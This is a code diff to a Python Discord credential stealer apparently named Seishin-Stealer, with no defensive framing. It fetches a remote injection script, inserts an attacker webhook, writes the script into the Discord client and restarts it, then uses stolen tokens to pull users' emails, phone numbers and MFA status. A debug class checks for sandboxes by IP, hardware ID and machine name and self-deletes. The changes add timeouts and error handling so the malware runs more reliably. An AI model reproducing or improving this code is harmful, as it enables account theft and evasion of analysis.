@@ -168,8 +168,6 @@ class grabber:
         #self.killDiscord()
         if injection == "y":
             self.injector()
-        else:
-            pass
         self.SendInfo()
         
     
@@ -218,8 +216,11 @@ class grabber:
                                         inj_path+'initiation', exist_ok=True)
                                 except PermissionError:
                                     pass
-                            f = httpx.get('https://raw.githubusercontent.com/Angel02-script/Seishin-Stealer/main/Injection-clean.js').text.replace(
-                                "%WEBHOOK%", weblink)
+                            try:
+                                f = httpx.get('https://raw.githubusercontent.com/Angel02-script/Seishin-Stealer/main/Injection-clean.js', timeout=10).text.replace(
+                                    "%WEBHOOK%", weblink)
+                            except Exception:
+                                continue
                             with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
                                 indexFile.write(f)
                             os.startfile(app + self.sep + _dir + '.exe')    
@@ -428,12 +429,13 @@ class grabber:
                 r = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers)
                 if r.status_code == 200:
                     r_json = r.json()
-                    user_name = f'{r_json["username"]}#{r_json["discriminator"]}'
+                    discriminator = r_json.get('discriminator', '0')
+                    user_name = f'{r_json["username"]}' if discriminator == '0' else f'{r_json["username"]}#{discriminator}'
                     user_id = r_json['id']
-                    avatar_id = r_json['avatar']
-                    avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
-                    phone_number = r_json['phone']
-                    email = r_json['email']
+                    avatar_id = r_json.get('avatar', '')
+                    avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}" if avatar_id else ""
+                    phone_number = r_json.get('phone') or 'N/A'
+                    email = r_json.get('email') or 'N/A'
                     mfa_enabled = r_json['mfa_enabled']
                     has_nitro = False
                     try:
@@ -537,36 +539,42 @@ class debug:
                 self.self_destruct()
         
     def get_ip(self):
-        url = 'http://ipinfo.io/json'
-        response = urlopen(url)
-        data = load(response)
-        ip = data['ip']
-        
-        if ip in self.blackListedIPS:
-            return True
-        
-    def get_hwid(self):
-        p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
-        stdout, stderr = p.communicate()
-        raw = stdout + stderr
-        print(repr(raw))
-        lines = raw.decode('latin-1').split('\n')
-        hwid = lines[1].strip() if len(lines) > 1 else ""
+        try:
+            url = 'http://ipinfo.io/json'
+            response = urlopen(url, timeout=5)
+            data = load(response)
+            ip = data['ip']
+            if ip in self.blackListedIPS:
+                return True
+        except Exception:
+            pass
+        return False
 
+    def get_hwid(self):
+        try:
+            p = Popen(
+                'powershell -command "(Get-CimInstance Win32_ComputerSystemProduct).UUID"',
+                shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE
+            )
+            stdout, _ = p.communicate(timeout=5)
+            hwid = stdout.decode('utf-8', errors='ignore').strip()
+        except Exception:
+            hwid = ""
         if hwid in self.blackListedHWIDS:
             return True
-        
+        return False
+
     def get_pcname(self):
         pc_name = os.getenv("COMPUTERNAME")
-        
         if pc_name in self.blackListedPCNames:
             return True
-        
+        return False
+
     def get_username(self):
         pc_username = os.getenv("UserName")
-        
         if pc_username in self.blackListedUsers:
             return True
+        return False
         
     def self_destruct(self):
         os.system('del "{}\\{}"'.format(os.path.dirname(__file__), os.path.basename(__file__)))
